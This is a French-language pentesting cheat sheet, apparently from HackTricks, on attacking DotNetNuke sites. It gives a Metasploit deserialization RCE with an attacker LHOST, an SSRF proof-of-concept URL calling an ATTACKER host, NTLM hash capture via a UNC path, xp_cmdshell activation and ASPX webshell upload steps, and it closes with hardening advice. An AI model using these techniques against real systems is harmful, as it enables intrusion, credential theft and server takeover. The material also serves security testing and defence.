# DotNetNuke (DNN)

{{#include ../../banners/hacktricks-training.md}}

## DotNetNuke (DNN)

Si vous entrez en tant qu'**administrateur** dans DNN, il est facile d'obtenir **RCE**, cependant un certain nombre de techniques *non authentifiées* et *post-auth* ont été publiées ces dernières années. La feuille de triche suivante collecte les primitives les plus utiles pour le travail offensif et défensif.

---
## Énumération de la version et de l'environnement

* Vérifiez l'en-tête de réponse HTTP *X-DNN* – il divulgue généralement la version exacte de la plateforme.
* L'assistant d'installation divulgue la version dans `/Install/Install.aspx?mode=install` (accessible sur des installations très anciennes).
* `/API/PersonaBar/GetStatus` (9.x) renvoie un blob JSON contenant `"dnnVersion"` pour les utilisateurs à faible privilège.
* Cookies typiques que vous verrez sur une instance en direct :
* `.DOTNETNUKE` – ticket d'authentification des formulaires ASP.NET.
* `DNNPersonalization` – contient des données de profil utilisateur XML/sérialisées (anciennes versions – voir RCE ci-dessous).

---
## Exploitation non authentifiée

### 1. RCE par désérialisation de cookie (CVE-2017-9822 et suivis)
*Versions affectées ≤ 9.3.0-RC*

`DNNPersonalization` est désérialisé à chaque requête lorsque le gestionnaire 404 intégré est activé. Un XML conçu peut donc conduire à des chaînes de gadgets arbitraires et à l'exécution de code.
```
msf> use exploit/windows/http/dnn_cookie_deserialization_rce
msf> set RHOSTS <target>
msf> set LHOST  <attacker_ip>
msf> run
```
Le module choisit automatiquement le bon chemin pour les versions corrigées mais toujours vulnérables (CVE-2018-15811/15812/18325/18326). L'exploitation fonctionne **sans authentification** sur 7.x–9.1.x et avec un compte *vérifié* à faible privilège sur 9.2.x+.

### 2. Server-Side Request Forgery  (CVE-2025-32372)
*Versions affectées < 9.13.8  –  Patch publié en avril 2025*

Un contournement de l'ancienne correction `DnnImageHandler` permet à un attaquant de contraindre le serveur à émettre **des requêtes GET arbitraires** (SSRF semi-aveugle). Impacts pratiques :

* Analyse de ports internes / découverte de services de métadonnées dans les déploiements cloud.
* Atteindre des hôtes autrement protégés par un pare-feu depuis Internet.

Preuve de concept (remplacer `TARGET` & `ATTACKER`):
```
https://TARGET/API/RemoteContentProxy?url=http://ATTACKER:8080/poc
```
La requête est déclenchée en arrière-plan ; surveillez votre écouteur pour les rappels.

### 3. Exposition de hachage NTLM via redirection UNC  (CVE-2025-52488)
*Versions affectées 6.0.0 – 9.x (< 10.0.1)*

Un contenu spécialement conçu peut amener DNN à tenter de récupérer une ressource en utilisant un **chemin UNC** tel que `\\attacker\share\img.png`. Windows effectuera volontiers la négociation NTLM, fuyant les hachages de compte serveur vers l'attaquant. Mettez à niveau vers **10.0.1** ou désactivez SMB sortant au niveau du pare-feu.

### 4. Contournement de filtre IP  (CVE-2025-52487)
Si les administrateurs s'appuient sur des *Filtres Host/IP* pour la protection du portail admin, sachez que les versions antérieures à **10.0.1** peuvent être contournées en manipulant `X-Forwarded-For` dans un scénario de proxy inverse.

---
## Post-authentification vers RCE

### Via la console SQL
Sous **`Settings → SQL`**, une fenêtre de requête intégrée permet l'exécution contre la base de données du site. Sur Microsoft SQL Server, vous pouvez activer **`xp_cmdshell`** et lancer des commandes :
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
xp_cmdshell 'whoami';
```
### Via téléchargement de webshell ASPX
1. Allez à **`Settings → Security → More → More Security Settings`**.
2. Ajoutez `aspx` (ou `asp`) à **Allowable File Extensions** et **Save**.
3. Accédez à **`/admin/file-management`** et téléchargez `shell.aspx`.
4. Déclenchez-le à **`/Portals/0/shell.aspx`**.

---
## Escalade de privilèges sur Windows
Une fois l'exécution de code obtenue en tant que **IIS AppPool\<Site>**, des techniques d'escalade de privilèges Windows courantes s'appliquent. Si la machine est vulnérable, vous pouvez tirer parti de :

* **PrintSpoofer** / **SpoolFool** pour abuser de *SeImpersonatePrivilege*.
* **Juicy/Sharp Potatoes** pour échapper aux *Service Accounts*.

---
## Recommandations de durcissement (Blue Team)

* **Mettez à niveau** vers au moins **9.13.9** (corrige le contournement SSRF) ou de préférence **10.0.1** (problèmes de filtre IP & NTLM).
* Supprimez les fichiers résiduels **`InstallWizard.aspx*`** après l'installation.
* Désactivez l'egress SMB sortant (ports 445/139).
* Appliquez des *Host Filters* stricts sur le proxy de bord plutôt qu'au sein de DNN.
* Bloquez l'accès à `/API/RemoteContentProxy` s'il n'est pas utilisé.

## Références

* Documentation du module Metasploit `dnn_cookie_deserialization_rce` – détails pratiques sur RCE non authentifié (GitHub).
* Avis de sécurité GitHub GHSA-3f7v-qx94-666m – informations sur le contournement SSRF de 2025 et le correctif.
{{#include ../../banners/hacktricks-training.md}}
